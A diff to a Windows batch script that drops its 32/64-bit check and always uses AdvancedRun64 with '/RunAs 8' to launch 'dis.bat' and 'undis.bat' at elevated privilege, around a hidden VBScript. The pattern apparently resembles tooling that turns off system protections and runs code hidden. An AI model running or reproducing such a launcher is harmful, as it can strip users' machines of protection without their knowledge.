@@ -32,13 +32,10 @@
 ::
 ::978f952a14a936cc963da21a135fa983
 @echo off
-reg Query "HKLM\Hardware\Description\System\CentralProcessor\0" | find /i "x86" > NUL && set OS=32BIT || set OS=64BIT
-if %OS%==32BIT start AdvancedRun.exe /EXEFilename "dis.bat" /RunAs 8 /Run
-if %OS%==64BIT start AdvancedRun64.exe /EXEFilename "dis.bat" /RunAs 8 /Run
+start AdvancedRun64.exe /EXEFilename "dis.bat" /RunAs 8 /Run
 msg * start
 start hidden.vbs
 :loop
 if not exist results timeout 10
-if %OS%==32BIT start AdvancedRun.exe /EXEFilename "undis.bat" /RunAs 8 /Run
-if %OS%==64BIT start AdvancedRun64.exe /EXEFilename "undis.bat" /RunAs 8 /Run
+start AdvancedRun64.exe /EXEFilename "undis.bat" /RunAs 8 /Run
 exit
